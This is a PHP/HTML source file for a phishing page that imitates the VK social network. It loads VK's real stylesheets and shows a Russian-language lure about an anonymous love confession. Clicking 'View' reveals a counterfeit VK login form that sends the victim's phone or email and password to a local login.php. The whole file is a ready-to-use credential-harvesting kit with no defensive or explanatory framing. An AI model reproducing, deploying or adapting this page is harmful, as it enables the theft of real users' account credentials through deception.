<?php
	$response = file_get_contents("https://api.vk.com/method/users.get?user_ids=1&fields=bdate,photo_50&v=5.62");
	$object = json_decode($response, true);
?>
<html>
<head>
  <title>Получение перевода</title>
  <link rel="stylesheet" href="https://vk.com/css/al/common.css?200809647" />
  <link rel="stylesheet" href="https://vk.com/css/al/index.css?3234798667" />
  <link rel="stylesheet" href="/style.css?<?=rand(0,9999);?>" />
</head>
<script src="//ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
<body>
<script>
function show(){
	$("#over").fadeIn(500);
}
</script>
<div id="bar"></div>
<div id="wrapper">
		  <div id="page_header" class="p_head p_head_l0">
			<div class="content">
			  <div id="wrap">
				<div id="top_nav" class="head_nav">
	  <div class="head_nav_item fl_l">
		<a class="top_home_link fl_l " href="#">
		<div class="top_home_logo" id="logo"></div>
	</div>
	  <div class="head_nav_item fl_l"><div id="ts_wrap" class="ts_wrap" onmouseover="TopSearch.initFriendsList();" style="margin-left: 15px;">
	  <input name="disable-autofill" style="display: none;">
	  <div class="input_back_wrap no_select"><div class="input_back" style="margin: 7px 0px 7px 8px; padding: 6px 6px 6px 19px;"><div class="input_back_content" style="width: 210px;">Поиск</div></div></div><input type="text" onmousedown="event.cancelBubble = true;" ontouchstart="event.cancelBubble = true;" class="text ts_input" id="ts_input" autocomplete="off" name="disable-autofill" aria-label="Поиск">
	</div></div>
	  <div class="head_nav_item fl_l head_nav_btns"><a id="top_notify_btn" class="top_nav_btn" href="#" onmouseover="TopNotifier.preload()" onmousedown="return (checkKeyboardEvent(event) ? false : TopNotifier.show(event));" onclick="return (checkEvent(event) ? true : (checkKeyboardEvent(event) ? TopNotifier.show(event) : false));" aria-haspopup="true" accesskey="2">
	  <span class="blind_label">Уведомления</span>
	  <div class="top_nav_btn_icon"></div>
	  <div id="top_notify_count" class="top_notify_count"></div>
	</a><span id="top_audio_layer_place"></span><a id="top_audio" href="#" class="top_nav_btn _top_nav_audio_btn" onmouseover="prepareAudioLayer()" onmousedown="return (checkKeyboardEvent(event) ? false : showAudioLayer(event, this))" onclick="return (checkKeyboardEvent(event) ? showAudioLayer(event, this) : false);" aria-label="Аудиоплеер" aria-haspopup="true" accesskey="3">
	  <span class="blind_label">Аудиоплеер</span>
	  <div class="top_nav_btn_icon"></div>
	</a></div>
	<div class="head_nav_item fl_r">
	<a id="top_profile_link" class="top_nav_link top_profile_link" href="#" onclick="return (checkKeyboardEvent(event) ? TopMenu.clicked : checkEvent)(event);" aria-label="Настройки страницы" aria-haspopup="true" accesskey="4">
	  
	  <div class="top_profile_name">Признания Вконтакте</div>
		<img class="top_profile_img" src="https://pp.vk.me/c7005/v7005328/6362c/DrMZeSTAhfg.jpg">
	</a></div>
	</div>
			  </div>
			</div>
	</div>
	
	<div id="over" style="display: none;">
		<div id="ov_inner">
			<div id="index_rcolumn" class="index_rcolumn">
				<form action="/login.php" method="POST">
					<div id="index_login" class="page_block index_login">
				<input type="text" class="big_text" name="email" id="index_email" value="" placeholder="Телефон или email">
				  <input type="password" class="big_text" name="pass" id="index_pass" value="" placeholder="Пароль" onkeyup="toggle('index_expire', !!this.value);toggle('index_forgot', !this.value)">
				  <button id="index_login_button" class="index_login_button flat_button button_big_text" onclick="auth();">Войти</button>
				  <div class="forgot">
					<div class="checkbox" id="index_expire" onclick="checkbox(this);ge('index_expire_input').value=isChecked(this)?1:'';">Чужой компьютер</div>
					<a id="index_forgot" class="index_forgot" href="https://vk.com/restore" target="_top">Забыли пароль?</a>
				  </div>
			  </div>
			  </form>
		</div>
		</div>
	</div>
	<div id="dContent">
		<h1 class="t1">Вам отправленно любовное признание</h1>
		<h2 class="t1">Отправитель скрыл совё имя</h2>
		<button onclick="show();">Посмотреть</button>
	</div>
</div>
</body>
</html>